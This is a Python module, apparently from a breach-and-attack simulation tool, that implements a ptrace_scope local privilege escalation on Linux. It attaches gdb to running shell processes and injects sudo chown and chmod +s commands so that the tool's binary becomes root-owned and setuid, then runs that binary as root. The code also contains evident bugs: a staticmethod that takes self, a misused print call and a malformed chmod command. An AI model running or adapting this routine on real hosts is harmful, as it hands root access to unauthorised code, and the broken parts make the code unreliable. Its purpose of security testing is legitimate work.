"""
    Implementation is based on 'ptrace_scope' misconfiguration Local Privilege Escalation
    https://www.exploit-db.com/exploits/46989
    if  /proc/sys/kernel/yama/ptrace_scope = 0 and there is a process with uid as the user running as root
"""
import os
import subprocess
from infection_monkey.pe import HostPrivExploiter
from logging import getLogger

LOG = getLogger(__name__)

__author__ = "D3fa1t"

pidOfShells = "pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'"  # list of all well known shells
setSUID = "echo 'call system(\"echo | sudo -S chown root %(file)s >/dev/null 2>&1 && echo" \
          " | sudo -S chmod +s root %(file)s >/dev/null 2>&1 \")' "  # Command that sets the SUID bit on the monkey.
ptrace_scope = "cat /proc/sys/kernel/yama/ptrace_scope"
GDB = "gdb -q -n -p %(pid)s"  # connect to process pid


def shell(cmd):
    """
    To run the command on the shell and to read the output.
    :param cmd: The commands to be run on the shell
    :return: returns the output
    """
    try:
        result = os.popen(cmd).read()[:-1]
        return result
    except OSError as e:
        LOG.error("Can't read from the shell!")
        return False


def check():
    """
    Checks if the machine is vulnerable by reading the value of
    /proc/sys/kernel/yama/ptrace_scope, if it's zero then its vulnerable.
    :return: True if vulnerable, else False
    """
    if shell(ptrace_scope) == '0':
        return True
    return False


class PtraceScopeExploiter(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""

    @staticmethod
    def try_priv_esc(self, command_line):
        """
        The function takes in the command line to run the monkey as an argument
        and tries to run the monkey as a root user.
        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
        :return: True if the pe is successful
        """
        self.file_path = command_line.split(' ')[0]

        # check if the machine is vulnerable
        if not check():
            LOG.error("Ptrace_scope is not 0, The machine is not vulnerable!")
            return False

        pidlist = shell(pidOfShells).split('\n')
        gdbcmd = setSUID % {'file': self.file_path}  # command to be injected, after attaching a process

        # Iterate through all the process id gathered and inject into them
        for pid in pidlist:
            # ("Trying to inject %s" % pid)
            gdb = GDB % {'pid': pid}
            shell(gdbcmd + " | " + gdb)

            # Check if the injection was successful by checking if the owner of the monkey is root
            if os.stat(self.file_path).st_uid == 0:
                # Run monkey as root
                LOG.info("Successfully injected into the process!")
                monkey_process = subprocess.Popen(command_line, shell=True,
                                                  stdin=None, stdout=None, stderr=None,
                                                  close_fds=True, creationflags=0)

                print("Executed monkey process as root with (PID=%d) with command line: %s",
                         monkey_process.pid, command_line)

                return True

        # Privilege escalation failed
        return False



